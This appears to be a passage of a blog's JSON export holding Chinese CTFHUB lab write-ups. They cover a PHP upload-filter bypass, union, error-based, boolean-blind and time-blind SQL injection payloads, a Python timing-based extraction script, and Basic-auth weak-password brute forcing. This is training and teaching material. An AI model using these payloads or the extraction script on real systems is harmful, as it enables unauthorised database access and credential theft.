array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;上传出错！&#x27;; &#125; &#125; else &#123; $msg = &#x27;此文件类型不允许上传！&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;文件夹不存在,请手工创建！&#x27;; &#125;&#125; 查看源码，我们使用后缀加”. .”的方法 上传成功","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"CTFHUB web之sql注入（一）","slug":"CTFwp/CTFHUB-web之sql注入（一）","date":"2025-04-05T16:00:00.000Z","updated":"2025-04-07T04:44:54.791Z","comments":true,"path":"2025/04/06/CTFwp/CTFHUB-web之sql注入（一）/","permalink":"http://example.com/2025/04/06/CTFwp/CTFHUB-web%E4%B9%8Bsql%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"","text":"这几天把sql注入最基础的一些给学了，用到了CTFHUB平台 1.整数型注入 拿到题目，打开网址，我们往输入框里输入1，显示如下，接下来我们输入 1&#x27;-- -1a&#x27; --1&quot; -- -1a&quot; -- -1 -- -1a -- - 我们发现，输入第五条时，回显存在，接下来我们以第五条为基础，编写我们的注入语句 我们查询的顺序依次是： DATABASE()——表名（table_name）——列名（column_name）——列中内容 首先我们使用order by语句 1 order by xxx -- - 我们注意到，order by语句后为1和2时存在回显，3则无回显，我们得知，接下来的联合查询union select语句 应该为 1 union select 1,2 -- - 输入后我们观察到 成功出现回显，将1改为-1接着我们逐步搜查表名，列名 库名： -1 union select 1,database() -- - 表名: -1 union select 1,table_name from information_schema.tables where table_schema = database() -- - 这里发现，只显示了其中一个表，为了显示出更多的表名，我们使用group_concat()函数，构造语句 -1 union select 1,group_concat(table_name) from information_schema.tables where table_schema = database() -- - 出现了第二个表名’flag’这个大概是我们需要的表 接下来是列名，我们构造语句 -1 union select 1,group_concat(column_name) from information_schema.columns where table_name = &#x27;flag&#x27; -- - 为了更严格，我们可以改为 -1 union select 1,group_concat(column_name) from information_schema.columns where table_schema = DATABASE() AND table_name = &#x27;flag&#x27; -- - 我们得到了列名，接下来可查询’flag’列中内容，我们构造语句 -1 union select 1,group_concat(flag) from flag -- - 成功得到flag：ctfhub{dcbabdd32219de44f1513c3b} 2.字符注入 与之前相同，我们先判断是否存在注入漏洞以及闭合方式 1&#x27;-- -1a&#x27; --1&quot; -- -1a&quot; -- -1 -- -1a -- - 接着我们来通过order by语句和union select语句 与上文的语句大致相同，我们可得到flag：ctfhub{0f30b333f2c779e2af8f9210} 3.报错注入 报错注入并不会直接返回信息，但还是存在回显的，我们可以通过构造语句，让报错的语句中出现我们想要得到的目标 这里我们使用extractvalue（）函数，concat（）函数，构造语句，得到结果 首先是查询库 1 and (select extractvalue(1,concat(0x7e,database()))) -- - 我们得到库名为’sqli’ 接下来构造语句查询表名 1 and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database())))) -- - 我们可得到表名’flag’，接下来我们可得到列名 1 and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = &#x27;flag&#x27;)))) -- - 接下来我们查询列’flag’中内容：ctfhub{c69dd4ccce9c6c70d507b54a} 1 and (select extractvalue(1,concat(0x7e,(select group_concat(flag) from flag)))) -- - 4.布尔盲注 这里我们注意到，已经几乎没有回显了，没有返回信息，但还存在query_success，来提醒我们查询是否成功，接下来我们就逐步，一点点从库长度，库名，表个数，表名长度，表名，列个数，列名长度，列名，到最后我们得到内容，内容字节较多，我们使用py脚本就行爆破，得到flag 首先是库长度，我们构造语句 2 and length(database()) #后接&#x27;&gt;&#x27;，&#x27;=&#x27;,&#x27;&lt;&#x27;,采用二分法判断 我们查出这里database（）长度为4 接下来我们来构造语句查询库名 2 and left(database(),1)=&#x27;x&#x27;2 and left(database(),2)=&#x27;xx&#x27;2 and left(database(),3)=&#x27;xxx&#x27;2 and left(database(),4)=&#x27;xxxx&#x27; 我们最后可以得到，库名为’sqli’ 接下来我们判断表的情况 因为表可能存在多个，所以我们先构造语句判断表的个数 我们使用count（）函数， 2 and (select count(*) from information_schema.tables where table_schema = database()) &gt; 1 -- - 我们得到，表有两个，接下来我们分别判断这两个表的长度 1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)) =4 -- - 我们通过改变limit 后数来选择表 0,1 #第一张表1,1 #第二张表 接着我们来爆表名 1 and (select substr(table_name,1,4) from information_schema.tables where table_schema = database() limit 1,1) = &#x27;flag&#x27; 我们分别得到第一张表名为’news’,第二张表名为’flag’ 接着我们来爆列个数，列长度，列名 分别构造语句 2 and (select count(*) from information_schema.columns where table_name = &#x27;flag&#x27;) =x -- - 2 and length(substr((select column_name from information_schema.columns where table_name = &#x27;flag&#x27; limit 0,1),1)) = -- - 2 and (select substr(column_name,1,4) from information_schema.columns where table_name = &#x27;flag&#x27; limit 0,1) = &#x27;flag&#x27; -- - 我们得到了列名为’flag’ 最后我们来爆出最后的flag flag过长，我们采用脚本爆破 import requestsimport sysimport timesession = requests.session()url = &quot;http://challenge-517a9541cbbd039b.sandbox.ctfhub.com:10800/?id=&quot;flag = &quot;&quot;# 查询 flag 字段的值for i in range(1, 50): # 假设 flag 长度不超过 50 for j in range(32, 127): # 可打印 ASCII 范围 str_ascii = chr(j) payload = f&quot;if(substr((select flag from sqli.flag limit 0,1),&#123;i&#125;,1)=&#x27;&#123;str_ascii&#125;&#x27;,sleep(1),1)&quot; start_time = time.time() response = session.get(url + payload) end_time = time.time() t = end_time - start_time if t &gt; 1: # 如果延迟超过 1 秒，说明字符匹配 flag += str_ascii print(f&quot;[+] Current flag: &#123;flag&#125;&quot;) break else: # 如果内层循环未 break，说明字符不在 32-126 范围，可能是结束 print(&quot;[!] Reached end of flag or invalid character.&quot;) breakprint(f&quot;\\n[!] Final flag: &#123;flag&#125;&quot;) 我们得到最终flag：ctfhub{ae5e12c7977a8ff51ed577e8} 5.时间盲注 你的意思是？时间盲注，就是在布尔盲注的基础上，因为没有回显，用到sleep（）函数和if（）函数，选用bp半自动注入？以返回时间为判断是否成功？ 拿到题目，我们发现，真的是啥都不回，我们采用时间盲注 这里用到if(condition,A,B)函数和sleep()函数，在if()函数中，若condition成立，则执行A条件语句，否则执行B条件语句 那我们先试一下基础的判断 1 and if(2&gt;1,sleep(5),1) -- - 这里我们发现，网页在近5秒后，才出现页面更改 接着我们像布尔盲注那样，慢慢爆破出各项 1 and if(left(database(),1)=&#x27;x&#x27;,sleep(5),1) -- -1 and if(left(database(),2)=&#x27;xx&#x27;,sleep(5),1) -- -1 and if(left(database(),3)=&#x27;xxx&#x27;,sleep(5),1) -- -1 and if(left(database(),4)=&#x27;xxxx&#x27;,sleep(5),1) -- - 我们成功得到库名’sqli’ 接下来是爆出表个数，表长度，表名 2 and if((select count(*) from information_schema.tables where table_schema = database()) =x ,sleep(5),1)-- - 2 and if (length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)) =4,sleep(5),1) -- - 2 and if((select substr(table_name,1,4) from information_schema.tables where table_schema = database() limit 1,1) = &#x27;flag&#x27;,sleep(5),1) -- - 我们成功得到了存在两张表，第二张表长度为4，表名为’flag’ 接下来是对列的个数，列长度，列名爆破 2 and if((select count(*) from information_schema.columns where table_name = &#x27;flag&#x27;) =x,sleep(5),1) -- - 2 and if(length(substr((select column_name from information_schema.columns where table_name = &#x27;flag&#x27; limit 0,1),1)) =4,sleep(5),1) -- - 2 and if((select substr(column_name,1,4) from information_schema.columns where table_name = &#x27;flag&#x27; limit 0,1) = &#x27;flag&#x27;,sleep(5),1) -- - 我们成功得到了列有1个，列长度为4，列名为’flag’ 我们借助脚本爆破出flag：ctfhub{3ddf5af78cc199cfe0536dd5} 展示成果： 彩蛋： 想要成为MUSE高手。。。","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"开端","slug":"开端","date":"2025-04-05T06:33:19.749Z","updated":"2025-04-05T06:32:14.844Z","comments":true,"path":"2025/04/05/开端/","permalink":"http://example.com/2025/04/05/%E5%BC%80%E7%AB%AF/","excerpt":"","text":"Creat river in the desert！","categories":[],"tags":[{"name":"发癫","slug":"发癫","permalink":"http://example.com/tags/%E5%8F%91%E7%99%AB/"}]},{"title":"CTFHUB web前置技能","slug":"CTFwp/CTFHUB web前置技能","date":"2025-04-01T16:00:00.000Z","updated":"2025-06-30T14:47:11.592Z","comments":true,"path":"2025/04/02/CTFwp/CTFHUB web前置技能/","permalink":"http://example.com/2025/04/02/CTFwp/CTFHUB%20web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/","excerpt":"","text":"CTFHUB web前置技能 HTTP协议： 1.请求方式： 翻译：HTTP Method 为 GET 使用 CTF**B 方法，我会给你标记。 提示： 如果你收到 “HTTP Method Not Allowed” 错误，你应该请求 index.php。 使用bp拦截，将GET请求改为题目中的CTFHUB，再次发送，得到flag ctfhub{02778be697ad5008bfe9ae63} 302跳转： 点击”give me flag“，发现无事发生，F12查看，发现状态302 用bp拦截到index.php文件的请求，发送到repeater，尝试再次发送，得到flag ctfhub{2fe8353641d31d1558f9daa9} 3.cookie 打开网页发现 发现有： Cookie: admin=0 发送到repeater，将0改为1，再次发送，得到flag ctfhub{a7948d76c6736defe3023c77} 4.基础认证 进入网页后，点击click，显示让我们输入用户与密码 随便输入用户与密码 在bp拦截看到 Authorization: Basic YXNkYXNkOmFzZGFzZA&#x3D;&#x3D; 一段base64编码，翻译后得到 asdasd:asdasd 我们尝试输入的账号与密码，中间使用‘：‘间隔， 发送到repeater查看响应 有一条 WWW-Authenticate: Basic realm=&quot;Do u know admin ?&quot; 我们尝试使用admin为账户名，以：为间隔，使用弱口令爆破 发送到bp的intruder，使用sniper攻击 GET /flag.html HTTP/1.1Host: challenge-8a31bab7ddbc3de3.sandbox.ctfhub.com:10800User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflate, brConnection: keep-aliveReferer: http://challenge-8a31bab7ddbc3de3.sandbox.ctfhub.com:10800/Upgrade-Insecure-Requests: 1Priority: u=0, iAuthorization: Basic YWRtaW46YWRtaW4= 将“YWRtaW46YWRtaW4&#x3D;”设为ayload位置，添加“admin:”为前缀，base64编码的条件，开始弱口令爆破 记得去掉URL编码字符 成功找到YWRtaW46MTIzNDU2 解码后得到admin:123456，输入后得到flag ctfhub{6e8d7b074034d888aefae96f} 5.响应包源代码 打开后发现是一个贪吃蛇小游戏 F12查看元素，得到flag ctfhub{ada8033f6296d9108c1623e9} 展示成果","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]}],"categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"发癫","slug":"发癫","permalink":"http://example.com/tags/%E5%8F%91%E7%99%AB/"}]}